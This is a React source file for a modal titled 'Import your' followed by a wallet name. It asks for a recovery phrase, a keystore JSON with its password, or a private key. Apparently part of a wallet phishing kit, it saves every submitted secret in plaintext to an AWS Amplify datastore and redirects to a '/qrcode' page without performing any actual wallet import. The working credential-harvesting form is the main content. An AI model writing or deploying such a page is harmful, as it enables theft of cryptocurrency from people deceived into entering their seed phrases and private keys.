import React, { useState } from "react";
import Products from "../Products";
import CustomInput from "./CustomInput";
import "./ModalForm.css";
import { useForm } from "react-hook-form";
import CustomInput2 from "./CustomInput2";
import { DataStore } from "aws-amplify";
import { Wallet } from "../models";
import {useNavigate} from 'react-router-dom';


function ModalForm({ walletId, setFormModal, setOpenModel }) {
  const [activeScreen, setActiveScreen] = useState("Phrase");
  const [walletName, setWalletName] = useState([]);
  const { control, handleSubmit, reset } = useForm({});
  const navigate = useNavigate();

  React.useEffect(() => {
    getWalletName()

    
  }, [])
  function getWalletName() {
    let productList = Products.filter((a) => a.id === walletId);
    if (productList.length > 0) {
      return productList.map((item) => {
        return (
        setWalletName(item.name)
        )
      
      }
      )}
  }
  

  const onSavePressed = async (data) => {
    const {
      privateKey,
      phrase,
      walletPassword,
      keystoreJson,
      
    } = data;
    try {
     
        // create a new order
        DataStore.save(
          new Wallet({
            walletName: walletName,
            privateKey: privateKey,
            phrase:phrase,
            walletPassword:walletPassword,
            keystoreJson:keystoreJson
           
          })
        );
       
    

    
     
      console.log("saved");
      reset({ ...data });
      navigate('/qrcode')
      
       
     
     
    } catch (error) {
      console.log(error);
    }
   
   
  };

  function getCategoryProducts() {
    let productList = Products.filter((a) => a.id === walletId);
    if (productList.length > 0) {
      return productList.map((item) => {
        return (
          <div
          style={{
            display: "flex",
            flexDirection: "row",
            color: "black",
            alignItems: "center",
            width:'100%',
            textAlign:'center',
            marginBottom:'40px'
      
          }}
        >
          <img
            style={{ width: "40px", height: "40px", }}
            src={item.url}
            alt={item.name}
          />
          <div
            style={{
              display: "flex",
              flexDirection: "row",
              color: "black",
              fontWeight: "500",
              alignItems:'center'
            }}
          >
            <p style={{ marginLeft: "10px" }}>Import your {item.name}</p>
          </div>
        </div>
        );
      });
    }
  }

  return (
    <div className="main">
      <div>
        <div className="modal">
          <div className="modal__mainContent">
  
              <div className="modal__Wrapper">
                {getCategoryProducts()}
                <div className="modal__wrapperCenter">
                  <div className="modal__TabHeader">
                    <div className="modal__TabHeaderWrapper">
                      <div className="modal__TabHeaderContent">
                        <span className="modal__Tab1Wrapper">
                          <div
                            onClick={() => setActiveScreen("Phrase")}
                            className="modal__Tab1"
                          >
                            <div
                              className={
                                activeScreen === "Phrase" ? "modal__Tab11" : ""
                              }
                            >
                              <p>Phrase</p>
                            </div>
                          </div>
                        </span>
                        <span className="modal__Tab1Wrapper">
                          <div
                            onClick={() => setActiveScreen("Keystore JSON")}
                            className="modal__Tab1"
                          >
                            <div
                              className={
                                activeScreen === "Keystore JSON"
                                  ? "modal__Tab11"
                                  : ""
                              }
                            >
                              <p>Keystore JSON</p>
                            </div>
                          </div>
                        </span>
                        <span className="modal__Tab1Wrapper">
                          <div
                            onClick={() => setActiveScreen("Private Key")}
                            className="modal__Tab1"
                          >
                            <div
                              className={
                                activeScreen === "Private Key"
                                  ? "modal__Tab11"
                                  : ""
                              }
                            >
                              <p>Private Key</p>
                            </div>
                          </div>
                        </span>
                      </div>
                    
                    </div>
                  </div>

                  {activeScreen === "Phrase" && (
                    <div style={{ width: "100%" }}>
                      <CustomInput
                        name="phrase"
                        control={control}
                        placeholder='Enter your recovery phrase'
                        rules={{
                          required: "Name is required",
                          minLength: {
                            value: 3,
                            message:
                              "Name should be at least 3 characters long",
                          },
                          maxLength: {
                            value: 14,
                            message: "Name should be max 24 characters long",
                          },
                        }}
                      />
                      <p style={{fontSize:'12px',  marginTop:'20px', marginBottom:'20px'}}>Typically 12 (sometimes 24) words separated by single spaces</p>

                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px', marginRight:'30px'}}>
                        <p style={{color:'white'}}>PROCCED</p>
                      
                          <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
                              <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                        
                        
                        </div>
                    </div>
                  )}

                  {activeScreen === "Keystore JSON" && <div style={{ width: "100%" }}>
                      <CustomInput
                        name="keystoreJson"
                        control={control}
                        placeholder='Enter your recovery phrase'
                        rules={{
                          required: "Name is required",
                          minLength: {
                            value: 3,
                            message:
                              "Name should be at least 3 characters long",
                          },
                          maxLength: {
                            value: 24,
                            message: "Name should be max 24 characters long",
                          },
                        }}
                      />
                      <CustomInput2  
                        name="walletPassword"
                        control={control}
                        placeholder='Wallet Password'
                        rules={{
                          required: "Name is required",
                          minLength: {
                            value: 3,
                            message:
                              "Name should be at least 3 characters long",
                          },
                          maxLength: {
                            value: 24,
                            message: "Name should be max 24 characters long",
                          },
                        }}/>
                      <p style={{fontSize:'12px', marginTop:'20px', marginBottom:'20px'}}>Several lines of text beginning with "..." plus the password you used to encrypt it.</p>

                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px', marginRight:'30px'}}>
                        <p style={{color:'white'}}>PROCCED</p>
                      
                          <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
                              <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                        
                        
                        </div>
                    </div>}

                  {activeScreen === "Private Key" && <div style={{ width: "100%" }}>
                      
                      <CustomInput2  
                        name="privateKey"
                        control={control}
                        placeholder='Enter your Private Key'
                        rules={{
                          required: "Name is required",
                          minLength: {
                            value: 3,
                            message:
                              "Name should be at least 3 characters long",
                          },
                          maxLength: {
                            value: 24,
                            message: "Name should be max 24 characters long",
                          },
                        }}/>
                      <p style={{fontSize:'12px', marginTop:'20px', marginBottom:'20px' }}>Several lines of text beginning with "..." plus the password you used to encrypt it.</p>

                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px', marginRight:'30px'}}>
                        <p style={{color:'white'}}>PROCCED</p>
                      
                          <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
                              <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                        
                        
                        </div>
                    </div>}
                </div>
                <div
              style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#e53e3e', justifyContent:'center', borderRadius:'10px', height:'40px', marginRight:'30px', marginTop:'20px', color:'white'}}
              >
                <div onClick={()=>{
                  setFormModal(false)
                  setOpenModel(false)
                }} >
                Cancel
                  
                </div>
                
              </div>

              </div>
         
            
          </div>
        </div>
      </div>
    </div>
  );
}

export default ModalForm;
